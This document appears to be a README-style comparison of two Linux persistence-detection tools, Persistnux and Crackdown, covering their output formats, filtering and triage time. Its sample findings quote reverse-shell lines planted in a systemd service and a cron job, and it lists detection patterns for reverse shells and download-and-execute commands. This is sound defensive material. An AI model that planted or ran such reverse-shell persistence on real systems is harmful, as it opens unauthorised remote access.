# Persistnux vs Crackdown - Output Comparison

## Executive Summary

| Tool | Persistnux v1.2.0 | Crackdown |
|------|------------------|-----------|
| **Default Output** | Suspicious only (MEDIUM/HIGH/CRITICAL) | Everything |
| **Typical Findings** | 15-30 on clean system | 200-500 on clean system |
| **False Positive Reduction** | ✅ Package manager integration | ❌ None |
| **Known-Good Filtering** | ✅ 30+ vendor services skipped | ❌ Reports all |
| **Confidence Scoring** | ✅ Dynamic (LOW/MEDIUM/HIGH/CRITICAL) | Basic severity (0-3) |
| **Format** | CSV + JSONL | CSV + JSON |
| **Focus** | Actionable threats | Comprehensive inventory |

---

## CSV Output Format Comparison

### Persistnux CSV Format

```csv
timestamp,category,subcategory,persistence_type,location,description,confidence,sha256,metadata,additional_info
```

**Example Row**:
```csv
2026-01-23T10:30:00Z,Systemd,Service,systemd_service,/etc/systemd/system/malware.service,"Service: malware.service | Status: enabled | ExecStart: /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444'",HIGH,e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855,mode:644|owner:root:root|size:256|modified:1706014800|accessed:1706014800|changed:1706014800,enabled=enabled|days_old=2|package=unmanaged
```

**Fields**:
1. `timestamp` - ISO 8601 UTC timestamp
2. `category` - Main category (Systemd, Cron, ShellProfile, SSH, etc.)
3. `subcategory` - Subcategory (Service, System, User)
4. `persistence_type` - Specific type (systemd_service, cron_script, etc.)
5. `location` - Full file path
6. `description` - Human-readable description with key details
7. `confidence` - LOW, MEDIUM, HIGH, or CRITICAL
8. `sha256` - File hash for IOC matching
9. `metadata` - File permissions, owner, size, timestamps (pipe-separated)
10. `additional_info` - Context: enabled status, age, package status (pipe-separated)

---

### Crackdown CSV Format

```csv
Name,Severity,Tip,Technique,Metadata
```

**Example Row**:
```csv
"Service File modified within last 30 days.",2,"Verify validity of installed service/configuration file.","T1543.002","ConfigType: ExecStart, DaysAgo: 15, File: /lib/systemd/system/some-service.service, LastModified: 2026-01-08 10:30:00 +0000 UTC, Line: ExecStart=/usr/bin/some-daemon"
```

**Fields**:
1. `Name` - Detection description
2. `Severity` - Numeric (0-3)
3. `Tip` - Remediation guidance
4. `Technique` - MITRE ATT&CK ID
5. `Metadata` - Comma-separated key:value pairs (variable structure)

---

## Side-by-Side Output Comparison

### Scenario: Clean Ubuntu 22.04 Server

#### Persistnux Output (Default Mode - Suspicious Only)

```
    ____                  _       __
   / __ \___  __________(_)____/ /___  __  ___  __
  / /_/ / _ \/ ___/ ___/ / ___/ __/ / / / |/_/ |/_/
 / ____/  __/ /  (__  ) (__  ) /_/ /_/ />  <_>  <
/_/    \___/_/  /____/_/____/\__/\__,_/_/|_/_/|_|

    Linux Persistence Detection Tool v1.2.0
    For DFIR Investigations

[+] Filter Mode: Suspicious only (MEDIUM/HIGH/CRITICAL)

[+] Checking systemd services...
[+] Checking cron jobs and scheduled tasks...
[+] Checking shell profiles and RC files...
[+] Checking SSH keys and configurations...
[+] Checking init scripts and rc.local...
[+] Checking kernel modules and LD_PRELOAD...
[+] Checking additional persistence mechanisms...

==========================================
Detection Complete!
==========================================
[+] Total findings logged: 12
[+] Results saved to:
[+]   CSV:   ./persistnux_output/persistnux_ubuntu-server_20260123_103000.csv
[+]   JSONL: ./persistnux_output/persistnux_ubuntu-server_20260123_103000.jsonl

[+] Analysis completed at Thu Jan 23 10:32:15 UTC 2026
```

**CSV Output** (12 findings):
```csv
timestamp,category,subcategory,persistence_type,location,description,confidence,sha256,metadata,additional_info
2026-01-23T10:30:05Z,Systemd,Service,systemd_service,/etc/systemd/system/multi-user.target.wants/docker.service,"Service: docker.service | Status: enabled | ExecStart: /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock",MEDIUM,a1b2c3d4...,mode:644|owner:root:root|size:1420|modified:1705410000,enabled=enabled|days_old=90|package=dpkg:docker-ce
2026-01-23T10:30:08Z,Cron,System,cron_script,/etc/cron.daily/logrotate,"Scheduled script: logrotate",MEDIUM,e5f6g7h8...,mode:755|owner:root:root|size:512|modified:1703818800,days_old=200|package=dpkg:logrotate
2026-01-23T10:30:12Z,ShellProfile,System,profile_script,/etc/profile.d/bash_completion.sh,"Profile.d script: bash_completion.sh",MEDIUM,i9j0k1l2...,mode:644|owner:root:root|size:2048|modified:1702609200,package=dpkg:bash-completion
...
```

---

#### Crackdown Output (All Mode)

```
[INFO] Finding System Services...
[INFO] Finding Cron Jobs...
[INFO] Finding Shell Configurations...
[INFO] Finding SSH Keys...
[INFO] Finding Startup Scripts...
[INFO] Finding Kernel Modules...
[INFO] Finding Environment Variables...
[INFO] Finding Local Users...
...
```

**CSV Output** (237 findings):
```csv
Name,Severity,Tip,Technique,Metadata
"Service File modified within last 30 days.",2,"Verify validity of installed service/configuration file.","T1543.002","ConfigType: ExecStart, DaysAgo: 15, File: /lib/systemd/system/systemd-timesyncd.service, LastModified: 2026-01-08 10:30:00 +0000 UTC"
"Service File modified within last 30 days.",2,"Verify validity of installed service/configuration file.","T1543.002","ConfigType: ExecStart, DaysAgo: 15, File: /lib/systemd/system/systemd-resolved.service, LastModified: 2026-01-08 10:30:00 +0000 UTC"
"Service File modified within last 30 days.",2,"Verify validity of installed service/configuration file.","T1543.002","ConfigType: ExecStart, DaysAgo: 15, File: /lib/systemd/system/networkd-dispatcher.service, LastModified: 2026-01-08 10:30:00 +0000 UTC"
"Service File modified within last 30 days.",2,"Verify validity of installed service/configuration file.","T1543.002","ConfigType: ExecStart, DaysAgo: 20, File: /lib/systemd/system/dbus.service, LastModified: 2026-01-03 14:22:00 +0000 UTC"
"Service File modified within last 30 days.",2,"Verify validity of installed service/configuration file.","T1543.002","ConfigType: ExecStart, DaysAgo: 22, File: /lib/systemd/system/snapd.service, LastModified: 2026-01-01 09:15:00 +0000 UTC"
...
(+ 232 more rows for every systemd service, cron job, shell profile, SSH key, etc.)
```

---

## Scenario: System with PANIX Malware Installed

PANIX installed:
- Malicious systemd service with reverse shell
- Cron job in `/etc/cron.d/` with backdoor
- Backdoor user in `.bashrc`

### Persistnux Output (Default Mode)

```
[+] Checking systemd services...
[FINDING] Suspicious systemd service: /etc/systemd/system/update-daemon.service

[+] Checking cron jobs and scheduled tasks...
[FINDING] Suspicious cron job: /etc/cron.d/freedesktop_timesync1

[+] Checking shell profiles and RC files...
[FINDING] Suspicious user profile: /home/victim/.bashrc (user: victim)

==========================================
Detection Complete!
==========================================
[+] Total findings logged: 15
```

**CSV Output** (showing only malicious findings):
```csv
timestamp,category,subcategory,persistence_type,location,description,confidence,sha256,metadata,additional_info
2026-01-23T10:30:05Z,Systemd,Service,systemd_service,/etc/systemd/system/update-daemon.service,"Service: update-daemon.service | Status: enabled | ExecStart: /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444'",HIGH,f3e2d1c0...,mode:644|owner:root:root|size:256|modified:1706014800,enabled=enabled|days_old=2|package=unmanaged
2026-01-23T10:30:12Z,Cron,System,cron_script,/etc/cron.d/freedesktop_timesync1,"Scheduled script: freedesktop_timesync1",HIGH,g4h5i6j7...,mode:644|owner:root:root|size:128|modified:1706014800,content_preview=* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/127.0.0.1/4444|days_old=2|package=unmanaged
2026-01-23T10:30:18Z,ShellProfile,User,user_profile,/home/victim/.bashrc,"User profile for victim",HIGH,k8l9m0n1...,mode:644|owner:victim:victim|size:3950|modified:1706014800,user=victim|package=unmanaged
```

**Analysis**: 3 HIGH confidence findings immediately visible, all unmanaged, all malicious.

---

### Crackdown Output (All Mode)

```csv
Name,Severity,Tip,Technique,Metadata
"Suspicious Pattern in Service Configuration",0,"Verify validity of installed service/configuration file.","T1543.002","ConfigType: ExecStart, File: /etc/systemd/system/update-daemon.service, LastModified: 2026-01-23 08:15:00 +0000 UTC, Line: ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444', Pattern: bash -i >& /dev/tcp/"
"Service File modified within last 30 days.",2,"Verify validity of installed service/configuration file.","T1543.002","ConfigType: ExecStart, DaysAgo: 15, File: /lib/systemd/system/systemd-timesyncd.service, LastModified: 2026-01-08 10:30:00 +0000 UTC"
"Service File modified within last 30 days.",2,"Verify validity of installed service/configuration file.","T1543.002","ConfigType: ExecStart, DaysAgo: 15, File: /lib/systemd/system/systemd-resolved.service, LastModified: 2026-01-08 10:30:00 +0000 UTC"
...
(+ 234 more legitimate services)
"Suspicious Pattern in Cron Job",0,"Review cron job for malicious commands","T1053.003","File: /etc/cron.d/freedesktop_timesync1, Pattern: /dev/tcp/, Line: * * * * * root /bin/bash -c 'sh -i >& /dev/tcp/127.0.0.1/4444'"
"Cron Job",0,"Review cron job","T1053.003","File: /etc/cron.daily/apt-compat"
"Cron Job",0,"Review cron job","T1053.003","File: /etc/cron.daily/dpkg"
...
(+ 50 more legitimate cron jobs)
```

**Analysis**: 3 malicious findings buried among 237 total findings. Analyst must manually filter.

---

## Key Differences in Detection Logic

### Persistnux Approach

1. **Pattern Matching**:
   - Detects reverse shells: `bash -i >& /dev/tcp/`, `nc -e`
   - Detects download-execute: `curl | bash`, `wget | sh`
   - Detects obfuscation: `base64 -d`, `eval`

2. **Package Manager Integration**:
   - Checks `dpkg -S` for each file
   - Downgrades confidence if package-managed
   - Example: `systemd-timesyncd.service` → LOW confidence (hidden by default)

3. **Known-Good Filtering**:
   - Skips `systemd-*`, `dbus-*`, `snap.*` entirely
   - Never appears in output, even with `--all`

4. **Time-Based Scoring**:
   - Files < 7 days old → Upgrade to HIGH
   - Combines with other indicators
   - Example: Recent + Unmanaged + Suspicious pattern = HIGH

5. **Output Filtering**:
   - Default: Only MEDIUM/HIGH/CRITICAL
   - Result: 15-30 actionable findings

---

### Crackdown Approach

1. **Pattern Matching**:
   - Similar patterns to Persistnux
   - Detects reverse shells, suspicious commands
   - Sets severity based on pattern type

2. **Package Manager Integration**:
   - ❌ None
   - All files treated equally

3. **Known-Good Filtering**:
   - ❌ None
   - Reports all systemd services

4. **Time-Based Flagging**:
   - Files < 30 days old → Severity 2
   - Flags ALL recent modifications (including package updates)
   - Example: System update 15 days ago = 50+ findings

5. **Output Filtering**:
   - ❌ None
   - Reports everything
   - Result: 200-500 findings

---

## Real-World Example: Ubuntu 22.04 with Docker Installed

### System State
- Package update 10 days ago (updated 47 systemd services)
- Docker installed 90 days ago
- 1 legitimate SSH key
- Standard cron jobs

### Persistnux Output (Default Mode)

**Findings**: 8 total
```
MEDIUM confidence (8):
- docker.service (package-managed, no suspicious patterns)
- containerd.service (package-managed, no suspicious patterns)
- /home/user/.ssh/authorized_keys (standard SSH key)
- /etc/cron.daily/logrotate (package-managed)
- /etc/cron.daily/dpkg (package-managed)
- /etc/profile.d/bash_completion.sh (package-managed)
- /home/user/.bashrc (no suspicious patterns)
- /etc/environment (standard)
```

**Analysis Time**: 2-3 minutes to review

---

### Crackdown Output (All Mode)

**Findings**: 189 total
```
Severity 2 (47): All systemd services modified 10 days ago
Severity 0 (142): All other systemd services, cron jobs, profiles, SSH keys
```

Sample findings:
```
"Service File modified within last 30 days." (systemd-timesyncd.service)
"Service File modified within last 30 days." (systemd-resolved.service)
"Service File modified within last 30 days." (networkd-dispatcher.service)
"Service File modified within last 30 days." (dbus.service)
"Service File modified within last 30 days." (snapd.service)
... (+ 42 more from package update)
"Service configuration exists" (accounts-daemon.service)
"Service configuration exists" (acpid.service)
... (+ 137 more legitimate services)
```

**Analysis Time**: 30-60 minutes to manually filter out legitimate findings

---

## Comparison Table: Detection Capabilities

| Detection Category | Persistnux | Crackdown | Winner |
|-------------------|-----------|-----------|--------|
| **Reverse Shells** | ✅ Detected | ✅ Detected | Tie |
| **Download-Execute** | ✅ Detected | ✅ Detected | Tie |
| **Obfuscation** | ✅ Detected | ✅ Detected | Tie |
| **Package-Managed Filtering** | ✅ Yes | ❌ No | Persistnux |
| **Vendor Service Filtering** | ✅ Yes | ❌ No | Persistnux |
| **False Positive Rate** | 🟢 Low | 🔴 High | Persistnux |
| **Analysis Time** | 🟢 2-5 min | 🟡 30-60 min | Persistnux |
| **Comprehensive Inventory** | ⚠️ Use --all | ✅ Default | Crackdown |
| **DFIR Efficiency** | ✅ High | ⚠️ Manual work | Persistnux |

---

## When to Use Each Tool

### Use Persistnux When:
- ✅ Active incident response (need quick triage)
- ✅ Threat hunting (looking for anomalies)
- ✅ High-volume analysis (multiple systems)
- ✅ Automated detection pipelines
- ✅ You want actionable findings immediately

### Use Crackdown When:
- ✅ Comprehensive baseline creation
- ✅ Forensic documentation (need everything)
- ✅ Manual deep-dive investigation
- ✅ Compliance audits (document all persistence)
- ✅ You have time to manually filter

---

## Output File Comparison

### Persistnux Files

```
persistnux_output/
├── persistnux_ubuntu-server_20260123_103000.csv     (15 findings, 2 KB)
└── persistnux_ubuntu-server_20260123_103000.jsonl   (15 findings, 3 KB)
```

### Crackdown Files

```
crackdown_output/
├── crackdown_ubuntu-server_20260123_103000.csv      (237 findings, 48 KB)
└── crackdown_ubuntu-server_20260123_103000.json     (237 findings, 156 KB)
```

---

## Parsing Examples

### Persistnux - Find High Confidence Findings

```bash
# CSV
grep ",HIGH," persistnux_*.csv

# JSONL
jq 'select(.confidence == "HIGH")' persistnux_*.jsonl
```

### Crackdown - Find High Severity Findings

```bash
# CSV (need to parse quoted fields carefully)
awk -F',' '$2 >= 2' crackdown_*.csv

# JSON (easier)
jq '.[] | select(.Severity >= 2)' crackdown_*.json
```

---

## Summary

**Persistnux v1.2.0**:
- Focus: Actionable threats
- Output: Clean, focused, immediately useful
- Best for: Incident response, threat hunting, automation

**Crackdown**:
- Focus: Comprehensive inventory
- Output: Everything, requires manual filtering
- Best for: Forensics, baselines, compliance

Both tools detect the same malicious patterns, but **Persistnux significantly reduces analyst workload** through intelligent filtering and false positive reduction.

---

**Recommendation**:
- Use **Persistnux** for day-to-day DFIR work
- Use **Crackdown** (or Persistnux `--all`) when you need comprehensive documentation
- Combine both for maximum coverage: Persistnux for quick triage, then Crackdown for deep-dive if needed
